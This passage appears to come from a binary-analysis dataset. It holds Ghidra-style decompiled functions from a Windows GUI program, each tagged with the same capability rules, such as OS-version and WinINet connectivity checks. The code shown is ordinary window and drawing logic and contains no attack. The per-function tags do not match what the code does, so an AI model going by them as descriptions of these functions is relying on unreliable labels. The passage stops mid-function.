        "decompiled_code": "\nvoid __fastcall fcn.0042abbc(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x218) == '\\0') {\n        *(in_EAX + 0x218) = 1;\n        uStack28 = 0x42ac21;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if ((*(param_2 + 6) == 0) || (*(param_2 + 6) == 5)) {\n            cVar1 = (**(**(in_EAX + 0x30) + 0xcc))();\n            if (cVar1 != '\\0') {\n                fcn.004330ec();\n            }\n        }\n        *in_FS_OFFSET = uStack32;\n        *(in_EAX + 0x218) = 0;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0042acb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0042acb8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00431c6c();\n    *(in_EAX + 0x50) = *0x42ad44;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 0x210) = uVar1;\n    iVar2 = fcn.00403228();\n    *(in_EAX + 0x214) = iVar2;\n    *(iVar2 + 0x24) = in_EAX;\n    *(iVar2 + 0x20) = 0x42af68;\n    *(in_EAX + 0x218) = 0xffffffff;\n    *(in_EAX + 0x21c) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 310
    },
    "0042ad98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042ad98(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack156;\n    uint uStack152;\n    uchar *puStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int32_t iStack136;\n    int32_t iStack132;\n    uint uStack128;\n    int32_t iStack124;\n    uint *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t lptm;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint hWinPosInfo;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if ((*(*(in_EAX + 0x210) + 8) != 0) && (*(in_EAX + 0x220) == '\\0')) {\n        uStack108 = 0;\n        uStack112 = 0x42adc7;\n        iVar2 = sub.user32.dll_GetDC();\n        uStack112 = 0x42add1;\n        uStack112 = fcn.0041c904();\n        puStack120 = 0x42add8;\n        iStack116 = iVar2;\n        uVar3 = sub.gdi32.dll_SelectObject();\n        puStack120 = &fcn.0042ad98::lptm;\n        uStack128 = 0x42ade4;\n        iStack124 = iVar2;\n        sub.gdi32.dll_GetTextMetricsA();\n        iStack136 = 0x42adeb;\n        iStack132 = iVar2;\n        uStack128 = uVar3;\n        sub.gdi32.dll_SelectObject();\n        iStack140 = 0;\n        iStack144 = 0x42adf3;\n        iStack136 = iVar2;\n        sub.user32.dll_ReleaseDC();\n        iStack144 = *(*(in_EAX + 0x210) + 8);\n        var_8h = *(in_EAX + 0x21c);\n        var_4h = (iStack144 + var_8h + -1) / var_8h;\n        var_8h = (*(in_EAX + 0x48) + -10) / var_8h;\n        var_14h = (*(in_EAX + 0x4c) - lptm) + -5;\n        var_ch = var_14h / var_4h;\n        var_10h = var_14h % var_4h >> 1;\n        if (var_10h < 0) {\n            var_10h = var_10h + ((var_14h % var_4h & 1U) != 0);\n        }\n        var_10h = var_10h + lptm + 1;\n        puStack148 = 0x42ae4b;\n        hWinPosInfo = sub.user32.dll_BeginDeferWindowPos();\n        uStack152 = 0x42af21;\n        uStack156 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff64;\n        iVar2 = *(*(in_EAX + 0x210) + 8);\n        if (-1 < iVar2 + -1) {\n            var_14h = 0;\n            puStack148 = &stack0xfffffffc;\n            var_20h = iVar2;\n            do {\n                piVar4 = fcn.00413b64();\n                (**(*piVar4 + 0x70))();\n                var_1ch = (var_14h / var_4h) * var_8h + 8;\n                uStack128 = 0x42aeae;\n                cVar1 = fcn.00403454();\n                if (cVar1 != '\\0') {\n                    uStack128 = 0x42aeb9;\n                    iVar2 = fcn.00438f30();\n                    var_1ch = (iVar2 - var_1ch) - var_8h;\n                }\n                uStack128 = 0x14;\n                iStack132 = var_ch;\n                iStack136 = var_8h;\n                iStack140 = (var_14h % var_4h) * var_ch + var_10h;\n                iStack144 = var_1ch;\n                puStack148 = NULL;\n                uStack152 = 0x42aee8;\n                uStack152 = fcn.0043fd08();\n                uStack156 = hWinPosInfo;\n                hWinPosInfo = sub.user32.dll_DeferWindowPos();\n                fcn.0043944c();\n                var_14h = var_14h + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        *in_FS_OFFSET = uStack156;\n        puStack148 = 0x42af28;\n        uStack152 = hWinPosInfo;\n        uStack156 = 0x42af20;\n        sub.user32.dll_EndDeferWindowPos();\n        return;\n    }\n    return;\n}\n",
        "token_count": 1178
    },
    "0042b0e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042b0e0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42b1a9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    (**(*in_EAX[0x85] + 0x14))();\n    fcn.0042afdc();\n    var_4h = *(in_EAX[0x84] + 8);\n    if (-1 < var_4h + -1) {\n        do {\n            (**(*in_EAX[0x85] + 0xc))();\n            fcn.00413b64(0);\n            fcn.0043955c();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    if (-1 < in_EAX[0x86]) {\n        *(in_EAX + 0x221) = 1;\n        piVar1 = fcn.00413b64();\n        (**(*piVar1 + 0xcc))();\n        *(in_EAX + 0x221) = 0;\n    }\n    fcn.0042ad98();\n    (**(*in_EAX + 0x7c))();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42b1b0;\n    uStack32 = 0x42b1a8;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 395
    },
    "0042c058": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0042c058(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = 0x42c07a;\n            iVar1 = fcn.00413b64();\n            if ((param_2 == *(iVar1 + 0x34)) && (*(iVar1 + 0x30) == param_1)) goto code_r0x0042c0ad;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar1 = fcn.0042beb8(param_1);\n    fcn.00413a08();\n    iVar3 = param_1;\ncode_r0x0042c0ad:\n    return CONCAT44(iVar3, iVar1);\n}\n",
        "token_count": 231
    },
    "0042c0b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c0b8(uint param_1, int32_t param_2)\n\n{\n    if ((param_2 != 0) && (*(param_2 + 0x84) == 0)) {\n        fcn.00413ca8();\n        fcn.00403258();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0042c0e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0042c0e8(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    iVar2 = fcn.00421984();\n    *(in_EAX + 4) = iVar2;\n    *(iVar2 + 0x14) = in_EAX;\n    *(iVar2 + 0x10) = fcn.0042c21c;\n    *(in_EAX + 0x1c) = 0x8080;\n    *(in_EAX + 0x20) = 1;\n    uVar1 = 0;\n    do {\n        *(in_EAX + 0xc + uVar1 * 4) = 0xffffffff;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 != 4);\n    if (*0x4619ac == 0) {\n        *0x4619ac = fcn.0042bfe4();\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 355
    },
    "0042c21c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c21c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == *(in_EAX + 4)) {\n        uVar1 = fcn.00422038();\n        *(in_EAX + 0x1c) = uVar1;\n        fcn.0042c1d8();\n        if (*(in_EAX + 0x2a) != 0) {\n            (**(in_EAX + 0x28))();\n        }\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0042c2ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0042c2ec(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack112;\n    uint uStack108;\n    uint *puVar9;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_28h;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t var_5h;\n    \n    var_5h._0_1_ = param_2;\n    if ((param_2 == 2) && (*(in_EAX + 0x20) < 3)) {\n        var_5h._0_1_ = 0;\n    }\n    iVar4 = *(in_EAX + 0xc + var_5h * 4);\n    if (iVar4 != -1) {\n        return iVar4;\n    }\n    puStack76 = 0x42c32e;\n    unique0x100005ae = in_EAX;\n    uVar2 = (**(**(in_EAX + 4) + 0x2c))();\n    puStack76 = 0x42c33b;\n    uVar3 = (**(**(stack0xfffffff8 + 4) + 0x20))();\n    if ((uVar2 | uVar3) == 0) {\n        return -1;\n    }\n    puStack76 = 0x42c34e;\n    iVar4 = (**(**(stack0xfffffff8 + 4) + 0x2c))();\n    iVar4 = iVar4 / *(stack0xfffffff8 + 0x20);\n    puStack76 = 0x42c367;\n    uVar5 = (**(**(stack0xfffffff8 + 4) + 0x20))();\n    if (*(stack0xfffffff8 + 8) == 0) {\n        if (*0x4619ac == 0) {\n            puStack76 = 0x42c387;\n            *0x4619ac = fcn.0042bfe4();\n        }\n        puStack76 = 0x42c39a;\n        uVar6 = fcn.0042c058();\n        *(stack0xfffffff8 + 8) = uVar6;\n    }\n    puStack76 = 0x42c3ac;\n    var_ch = fcn.00421984();\n    uStack80 = 0x42c89b;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    fcn.00412730(&fcn.0042c2ec::var_28h, uVar5);\n    fcn.00421f4c();\n    fcn.0041d0bc();\n    (**(**(stack0xfffffff8 + 4) + 0x24))();\n    fcn.00421714();\n    (**(*var_ch + 0x38))();\n    puVar9 = 0x42c437;\n    fcn.00412730(&fcn.0042c2ec::var_38h, uVar5);\n    if (var_5h != 0) {\n        if (var_5h == 1) {\n            var_14h = NULL;\n            var_10h = NULL;\n            uStack108 = 0x42c85f;\n            iStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            var_14h = fcn.00421984();\n            var_10h = fcn.00421984();\n            (**(*var_10h + 8))();\n            (**(*var_10h + 0x6c))();\n            if (*(stack0xfffffff8 + 0x20) < 2) {\n                (**(*var_14h + 8))();\n                (**(*var_14h + 0x6c))();\n                fcn.00421f4c();\n                fcn.0041d0bc();\n                (**(*var_14h + 0x40))();\n                cVar1 = fcn.00422008();\n                if (cVar1 != '\\0') {\n                    fcn.00421f4c();\n                    fcn.0041c8f0();\n                    fcn.00422d1c();\n                    fcn.00421f4c();\n                    fcn.0041d0bc();\n                }\n                fcn.00422d1c();\n                fcn.00421f4c();\n                fcn.0041d0bc();\n                fcn.0041d460();\n                fcn.0041d0bc();\n                uVar6 = fcn.0041d804(0);\n                sub.gdi32.dll_SetTextColor(uVar6);\n                uVar6 = fcn.0041d804(0xffffff);\n                sub.gdi32.dll_SetBkColor(uVar6);\n                fcn.00421f4c(0, 0, 0xe20746);\n                uVar6 = fcn.0041d804();\n                uVar6 = fcn.0041d804(1, 1, iVar4, uVar5, uVar6);\n                sub.gdi32.dll_BitBlt(uVar6);\n                fcn.0041d0bc();\n                uVar6 = fcn.0041d804(0);\n                sub.gdi32.dll_SetTextColor(uVar6);\n                uVar6 = fcn.0041d804(0xffffff);\n                sub.gdi32.dll_SetBkColor(uVar6);\n                fcn.00421f4c(0, 0, 0xe20746);\n                uVar6 = fcn.0041d804();\n                iVar8 = fcn.0041d804(0, 0, iVar4, uVar5, uVar6);\n                sub.gdi32.dll_BitBlt();\n            }\n            else {\n                var_18h = fcn.00421f4c();\n                puVar9 = &fcn.0042c2ec::var_38h;\n                fcn.00421f4c();\n                fcn.0041d32c(puVar9);\n                fcn.00422d1c();\n                (**(*var_14h + 0x40))();\n                (**(*var_14h + 0x34))();\n                fcn.00421f4c();\n                fcn.0041d0bc();\n                puVar9 = &fcn.0042c2ec::var_38h;\n                uVar6 = fcn.00421f4c();\n                fcn.00421f4c(uVar6);\n                fcn.0041d32c(puVar9);\n                fcn.0041d0bc();\n                uVar6 = fcn.0041d804();\n                sub.gdi32.dll_SetTextColor(uVar6, 0);\n                sub.gdi32.dll_SetBkColor(uVar6, 0xffffff);\n                fcn.00421f4c(0, 0, 0xe20746);\n                uVar7 = fcn.0041d804();\n                sub.gdi32.dll_BitBlt(uVar6, 0, 0, iVar4, uVar5, uVar7);\n                fcn.00421f4c();\n                fcn.0041d0bc();\n                puVar9 = &fcn.0042c2ec::var_38h;\n                uVar6 = fcn.00421f4c();\n                fcn.00421f4c(uVar6);\n                fcn.0041d32c(puVar9);\n                fcn.0041d0bc();\n                uVar6 = fcn.0041d804();\n                sub.gdi32.dll_SetTextColor(uVar6, 0);\n                sub.gdi32.dll_SetBkColor(uVar6, 0xffffff);\n                fcn.00421f4c(0, 0, 0xe20746);\n                uVar7 = fcn.0041d804();\n                sub.gdi32.dll_BitBlt(uVar6, 0, 0, iVar4, uVar5, uVar7);\n                uVar6 = fcn.0041c430();\n                fcn.00421f4c(uVar6);\n                fcn.0041d0bc();\n                puVar9 = &fcn.0042c2ec::var_38h;\n                uVar6 = fcn.00421f4c();\n                fcn.00421f4c(uVar6);\n                fcn.0041d32c(puVar9);\n                fcn.0041d0bc();\n                iVar8 = fcn.0041d804();\n                sub.gdi32.dll_SetTextColor(iVar8, 0);\n                sub.gdi32.dll_SetBkColor(iVar8, 0xffffff);\n                fcn.00421f4c(0, 0, 0xe20746);\n                uVar6 = fcn.0041d804();\n                sub.gdi32.dll_BitBlt(iVar8, 0, 0, iVar4, uVar5, uVar6);\n            }\n            *in_FS_OFFSET = iVar8;\n            fcn.00403258(0x42c866);\n            iVar4 = fcn.00403258();\n            return iVar4;\n        }\n        if (1 < var_5h - 2) goto code_r0x0042c885;\n    }\n    puVar9 = &fcn.0042c2ec::var_38h;\n    uStack108 = 0x42c458;\n    uStack108 = fcn.00421f4c();\n    iStack112 = 0x42c461;\n    fcn.00421f4c();\n    uStack108 = 0x42c46a;\n    fcn.0041d32c(puVar9);\n    if (*(*(stack0xfffffff8 + 4) + 0x38) == '\\x01') {\n        uStack108 = 0x42c48a;\n        uVar5 = fcn.0042bf88();\n        *(stack0xfffffff8 + 0xc + var_5h * 4) = uVar5;\n    }\n    else {\n        uStack108 = 0x42c4ae;\n        uVar5 = fcn.0042bf88();\n        *(stack0xfffffff8 + 0xc + var_5h * 4) = uVar5;\n    }\ncode_r0x0042c885:\n    *in_FS_OFFSET = puVar9;\n    iVar4 = fcn.00403258();\n    return iVar4;\n}\n",
        "token_count": 2483
    },
    "0042c8c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c8c4(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *arg_10h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 4) != 0) && (iVar2 = (**(**(in_EAX + 4) + 0x2c))(),  iVar2 != 0)) &&\n       (iVar2 = (**(**(in_EAX + 4) + 0x20))(),  iVar2 != 0)) {\n        uVar3 = fcn.0042c2ec();\n        fcn.0042f140();\n        cVar1 = fcn.0042f220();\n        if (cVar1 == '\\0') {\n            if ((arg_8h == '\\0') && (arg_ch != '\\x03')) {\n                uVar4 = fcn.0041c430(0x1fffffff, 0);\n                uVar4 = fcn.0041d804(*var_8h, var_8h[1], 0, 0, uVar4);\n                uVar3 = fcn.00446840(uVar3, uVar4);\n                sub.comctl32.dll_ImageList_DrawEx(uVar3);\n            }\n            else {\n                uVar4 = fcn.0041d804(*var_8h, var_8h[1], 0, 0, 0x1fffffff, 0x1fffffff, 1);\n                uVar3 = fcn.00446840(uVar3, uVar4);\n                sub.comctl32.dll_ImageList_DrawEx(uVar3);\n            }\n        }\n        else {\n            var_24h = *var_8h;\n            var_20h = var_8h[1];\n            iVar2 = (**(**(in_EAX + 4) + 0x2c))();\n            var_1ch = iVar2 / *(in_EAX + 0x20) + var_24h;\n            var_18h = (**(**(in_EAX + 4) + 0x20))();\n            var_18h = var_18h + var_20h;\n            fcn.0042f140();\n            fcn.0042f484();\n            arg_10h = &var_24h;\n            uVar4 = fcn.00446840();\n            uVar5 = fcn.0041d804();\n            fcn.0042f140(uVar5);\n            fcn.0042f370(uVar3, uVar4, arg_10h);\n        }\n    }\n    return;\n}\n",
        "token_count": 663
    },
    "0042cb08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042cb08(uint32_t arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            uint arg_20h, int32_t *arg_24h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    uint var_40h;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t dx;\n    int32_t dy;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_8h & 2) == 2) {\n        if (arg_1ch == 0) {\n            arg_1ch._0_1_ = 1;\n        }\n        else if (arg_1ch == 1) {\n            arg_1ch._0_1_ = 0;\n        }\n    }\n    var_4h = in_EAX;\n    fcn.00412708();\n    if (*(var_4h + 4) == 0) {\n        fcn.00412708();\n    }\n    else {\n        uVar2 = (**(**(var_4h + 4) + 0x20))();\n        (**(**(var_4h + 4) + 0x2c))(uVar2);\n        fcn.00412708();\n    }\n    iVar3 = fcn.00404268();\n    if (iVar3 < 1) {\n        fcn.00412730(&var_40h, 0);\n        *arg_ch = var_40h;\n        arg_ch[1] = uStack64;\n        arg_ch[2] = uStack60;\n        arg_ch[3] = uStack56;\n        fcn.00412708();\n    }\n    else {\n        fcn.00412730(&var_40h, 0);\n        *arg_ch = var_40h;\n        arg_ch[1] = uStack64;\n        arg_ch[2] = uStack60;\n        arg_ch[3] = uStack56;\n        uVar2 = fcn.00404268(arg_ch, arg_8h | 0x400);\n        uVar2 = fcn.00404468(uVar2);\n        uVar2 = fcn.0041d804(uVar2);\n        sub.user32.dll_DrawTextA(uVar2);\n        fcn.00412708();\n    }\n    if (arg_1ch < 2) {\n        uVar4 = (var_14h - var_1ch) + 1;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        arg_10h[1] = iVar3;\n        uVar4 = (var_14h - var_24h) + 1;\n        dy = uVar4 >> 1;\n        if (dy < 0) {\n            dy = dy + ((uVar4 & 1) != 0);\n        }\n    }\n    else {\n        uVar4 = (var_18h - var_20h) + 1;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        *arg_10h = iVar3;\n        uVar4 = (var_18h - var_28h) + 1;\n        dx = uVar4 >> 1;\n        if (dx < 0) {\n            dx = dx + ((uVar4 & 1) != 0);\n        }\n    }\n    if ((var_28h == 0) || (var_20h == 0)) {\n        arg_14h = 0;\n    }\n    if (arg_18h == -1) {\n        if (arg_14h == -1) {\n            fcn.00412708();\n            if (arg_1ch < 2) {\n                var_30h = var_18h - var_30h;\n            }\n            else {\n                var_30h = var_14h - var_2ch;\n            }\n            arg_18h = var_30h / 3;\n            arg_14h = arg_18h;\n        }\n        else {\n            fcn.00412708();\n            if (arg_1ch < 2) {\n                uVar4 = (var_18h - var_30h) + 1;\n                arg_18h = uVar4 >> 1;\n                if (arg_18h < 0) {\n                    arg_18h = arg_18h + ((uVar4 & 1) != 0);\n                }\n            }\n            else {\n                uVar4 = (var_14h - var_2ch) + 1;\n                arg_18h = uVar4 >> 1;\n                if (arg_18h < 0) {\n                    arg_18h = arg_18h + ((uVar4 & 1) != 0);\n                }\n            }\n        }\n    }\n    else if (arg_14h == -1) {\n        fcn.00412708();\n        if (arg_1ch < 2) {\n            arg_14h = var_30h - var_28h >> 1;\n            if (arg_14h < 0) {\n                arg_14h = arg_14h + ((var_30h - var_28h & 1U) != 0);\n            }\n        }\n        else {\n            arg_14h = var_2ch - var_24h >> 1;\n            if (arg_14h < 0) {\n                arg_14h = arg_14h + ((var_2ch - var_24h & 1U) != 0);\n            }\n        }\n    }\n    if (arg_1ch == 0) {\n        *arg_10h = arg_18h;\n        dx = arg_18h + var_20h + arg_14h;\n    }\n    else if (arg_1ch == 1) {\n        var_20h = (var_18h - arg_18h) - var_20h;\n        *arg_10h = var_20h;\n        dx = (var_20h - arg_14h) - var_28h;\n    }\n    else if (arg_1ch == 2) {\n        arg_10h[1] = arg_18h;\n        dy = arg_18h + var_1ch + arg_14h;\n    }\n    else if (arg_1ch == 3) {\n        var_1ch = (var_14h - arg_18h) - var_1ch;\n        arg_10h[1] = var_1ch;\n        dy = (var_1ch - arg_14h) - var_24h;\n    }\n    *arg_10h = *arg_10h + *in_ECX + *arg_24h;\n    arg_10h[1] = arg_10h[1] + in_ECX[1] + arg_24h[1];\n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (cVar1 == '\\0') {\n        sub.user32.dll_OffsetRect(arg_ch, *in_ECX + dx + *arg_24h, in_ECX[1] + dy + arg_24h[1]);\n    }\n    else {\n        sub.user32.dll_OffsetRect(arg_ch, *in_ECX + dx, in_ECX[1] + dy);\n    }\n    return;\n}\n",
        "token_count": 1813
    },
    "0042cf84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0042cf84(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.0042c0e8();\n    in_EAX[0x5b] = iVar1;\n    iVar1 = in_EAX[0x5b];\n    *(iVar1 + 0x2c) = in_EAX;\n    *(iVar1 + 0x28) = 0x42d7b4;\n    fcn.00440e9c();\n    uVar2 = 0x16;\n    (**(*in_EAX + 0x84))(0x16, 0x17);\n    in_EAX[0x14] = *0x42d040;\n    fcn.00439658();\n    fcn.004396cc();\n    in_EAX[0x5d] = 4;\n    in_EAX[0x5f] = -1;\n    *(in_EAX + 0x173) = 0;\n    *(in_EAX + 0x5e) = 1;\n    *0x4619b0 = *0x4619b0 + 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 388
    },
    "0042d07c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042d07c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint uVar10;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_19h;\n    uint uStack25;\n    uint uStack21;\n    uint uStack17;\n    char var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    uStack88 = 0x42d4a6;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack92;\n    cVar1 = (**(*in_EAX + 0x50))();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x182) = 1;\n        *(in_EAX + 0x171) = 0;\n    }\n    else if (*(in_EAX + 0x182) == '\\x01') {\n        if ((*(in_EAX + 0x5c) == '\\0') || (in_EAX[0x5a] == 0)) {\n            *(in_EAX + 0x182) = 0;\n        }\n        else {\n            *(in_EAX + 0x182) = 3;\n        }\n    }\n    fcn.0041d724();\n    fcn.0042f140();\n    cVar1 = fcn.0042f220();\n    if (cVar1 == '\\0') {\n        fcn.00412730(&var_19h, in_EAX[0x13]);\n        if (*(in_EAX + 0x60) == '\\0') {\n            uVar2 = 0x2010;\n            if (*(in_EAX + 0x182) - 